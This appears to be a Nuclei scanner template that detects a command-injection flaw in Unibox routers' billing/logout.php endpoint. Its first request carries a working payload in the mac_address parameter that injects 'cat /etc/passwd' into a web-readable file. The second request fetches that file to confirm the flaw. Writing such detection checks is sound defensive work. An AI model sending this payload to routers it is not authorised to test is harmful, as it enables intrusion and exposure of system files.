id: unibox-router-logout-php-command-injection
info:
  name: Unibox Router logout.php Command Injection
  author: ProjectDiscoveryAI
  severity: critical
  tags: command-injection
  description: |
    This template detects a command injection vulnerability in Unibox routers via the logout.php endpoint.

variables:
  t1: "{{rand_base(5)}}"

http:
  - id: initial-check
    method: GET
    path:
      - "{{BaseURL}}/billing/logout.php?logout_user=1&mac_address=;cat%20/etc/passwd>{{t1}}.txt"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Unibox"

  - id: validate-injection
    method: GET
    path:
      - "{{BaseURL}}/billing/{{t1}}.txt"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:"
          - "/bin"
      - type: word
        part: body
        negative: true
        words:
          - "<"
